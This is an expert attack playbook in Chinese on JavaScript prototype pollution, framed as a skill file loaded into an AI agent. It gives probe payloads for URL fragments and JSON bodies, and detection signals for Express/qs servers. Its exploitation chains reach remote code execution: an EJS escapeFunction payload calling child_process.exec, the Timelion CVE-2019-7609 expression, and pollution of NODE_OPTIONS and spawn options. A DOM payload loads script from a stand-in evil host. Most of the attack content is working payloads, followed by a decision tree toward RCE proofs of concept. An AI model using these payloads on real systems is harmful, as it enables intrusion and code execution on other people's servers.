# 技能：原型污染——专家攻击手册

> **AI 加载指令**：针对客户端和服务器端 JS 的专家级原型污染。涵盖 `__proto__` 与 `constructor.prototype` 的区别、合并-接收检测、Express/qs 风格的黑盒探测以及利用链（EJS、Timelion 类模式、child_process/NODE_OPTIONS）。假设您已了解对象展开和原型继承——重点在于 **解析行为** 和 **污染后接收端**。

路由提示：当您看到深层合并、递归赋值、`JSON.parse` 后跟 `Object.assign` 或 URL 查询转换为嵌套对象时，优先考虑 PP（原型污染）。

## 0. 快速入门

### 客户端首次探测

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

当输入可以反射到 DOM 或框架路由时，搭配 `alert(1)` / `console` 检查，观察全局对象属性是否被污染。

```text
#__proto__[xxx]=alert(1)
```

### 服务器端首次探测（JSON / 表单）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

发送后，检查无关后续响应是否显示异常的头部/状态/JSON 间距，或应用程序逻辑是否读取 `Object.prototype.polluted`（参见 §3 检测表）。

### 快速布尔值

如果目标代码使用 `lodash.merge`、`deep-extend`、`hoek.applyToDefaults` 或某些 `qs`/`query-string` 配置，**提高优先级**。

---

## 1. 原理

**原型链**：当访问 `obj.key` 时，如果 `obj` 缺少自有属性 `key`，查找会沿着 `[[Prototype]]` 向上遍历，直到 `Object.prototype`。

**`__proto__`**：许多解析器将字面量键 `__proto__` 视为一种魔法路径，将子属性附加到原型上。合并 `{ "__proto__": { "x": 1 } }` 可能等同于 `Object.prototype.x = 1`，具体取决于实现和补丁级别。

**`constructor.prototype`**：`constructor` 通常指向对象的构造函数；`constructor.prototype` 是该构造函数的原型对象。对于普通对象，这通常链接到 `Object.prototype`。示例路径：

```json
{"constructor":{"prototype":{"polluted":1}}}
```

这并不总是等同于 `__proto__`（过滤、JSON 解析、Bun/Node 差异），因此 **测试两条路径**。

**核心问题**：这不仅仅是“多了一个参数”；在非隔离的合并逻辑中，攻击者控制的键指向 **原型对象**，为 **全局** 或共享模板上下文赋予恶意属性，后续代码正常读取这些属性，触发利用。

---

## 2. 客户端检测

### URL 片段

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

如果路由器或分析代码将片段解析为对象然后合并，可能会发生污染。

### `constructor.prototype` 路径

```text
#constructor[prototype][role]=admin
```

### DOM / 属性注入思路

如果框架将属性名作为对象键合并：

```text
__proto__[src]=//evil/xss.js
```

事件处理器风格键（实现依赖）：

```text
__proto__[onerror]=alert(1)
```

**验证**：打开一个不带片段的新页面，在控制台中检查测试键是否仍存在于 `Object.prototype` 上；考虑扩展和开发者工具的干扰。

---

## 3. 服务器端检测（Express / Node，黑盒）

以下负载假设请求体/查询被深度解析为对象（可能通过 `qs` 或类似解析器），观察 **全局副作用**，而不仅仅是当前端点的返回值。

| 负载（JSON 示例） | 预期可观察信号 |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | 后续请求中的多参数解析被忽略或异常（`qs` 风格的 `parameterLimit`） |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | 双问号前缀如 `??foo=bar` 被接受或行为急剧变化 |
| `{"__proto__":{"allowDots":true}}` | 嵌套键如 `?foo.bar=baz` 通过点表示法展开 |
| `{"__proto__":{"json spaces":" "}}` | JSON 序列化响应获得额外空格（`JSON.stringify` 间距设置被污染） |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS 响应包含 `foo` 相关的头部（如果框架从原型读取配置） |
| `{"__proto__":{"status":510}}` | 某些响应状态变为 510 或其他异常代码（应用程序从对象读取 `status`） |

**操作提示**：先发送污染请求，然后发送一个 **干净** 的请求观察持久性；连接池和工作进程生命周期会影响影响是否全局可见。

---

## 4. 利用利用链

| 目标 / 场景 | 负载或模式 | 备注 |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | 如果模板引擎选项如 `escapeFunction` 从污染的原型读取，这可能导致 RCE；强烈依赖版本/配置 |
| **Timelion 表达式链（CVE-2019-7609）** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | 历史利用链：原型污染 + 时间线表达式执行；有助于理解 **表达式 + PP** 组合 |
| **Node `child_process`** | 污染 `shell`、`argv0`、`env`、`NODE_OPTIONS` 等（合并到 `exec`/`fork` 选项对象） | 取决于后续代码是否调用 `spawn`/`fork` 并从原型链读取选项 |
| **通用构造函数路径** | `{"constructor":{"prototype":{"foo":"bar"}}}` | 绕过仅过滤 `__proto__` 键的弱验证 |

**链思维**：污染 -> 依赖读取 `obj.settings.xxx` 而无 `hasOwnProperty` -> RCE / SSRF / 路径遍历。

---

## 5. 工具

| 项目 | 目的 |
|------|------|
| **yeswehack/pp-finder** | 帮助定位易受 PP 污染的合并点和模式 |
| **yuske/silent-spring** | 原型污染表面研究和检测 |
| **yuske/server-side-prototype-pollution** | 服务器端 PP 测试套件/方法 |
| **BlackFan/client-side-prototype-pollution** | 浏览器端 PP 案例和负载 |
| **portswigger/server-side-prototype-pollution** | Burp 生态系统扩展/支持材料 |
| **msrkp/PPScan** | 扫描/验证辅助工具 |

优先在 **授权** 目标上使用；自动化工具可能对有状态应用程序造成副作用。

---

## 6. 决策树

```
                    输入合并到嵌套对象？
                    (查询、JSON、GraphQL 变量、YAML→JSON)
                                |
               否 --------------+-------------- 是
               |                              |
        其他漏洞类别                解析器允许 __proto__ /
                                        constructor.prototype 键？
                                                    |
                                    否 --------------+-------------- 是
                                    |                              |
                             检查 Unicode /                    确认全局效果：
                             绕过键名 bypass                干净后续请求
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    利用链存在？ (模板、spawn、JSON.stringify 选项、CORS)
                                                   |
                              否 ------------------+------------------ 是
                              |                                         |
                       报告 PP 作为 DoS /              构建 RCE 或
                       逻辑影响                   高影响 PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              客户端：片段 / DOM / 第三方脚本
                              服务器端：qs/body-parser/lodash/deep-merge 版本审计
```

---

## 相关路由

- 输入路由和多注入并行入口 -> [注入测试路由](../injection-checking/SKILL.md)。
- 模板执行链（非 PP）-> [SSTI](../ssti-server-side-template-injection/SKILL.md)。
- 不安全的反序列化（非 JS 原型）-> [反序列化](../deserialization-insecure/SKILL.md)。
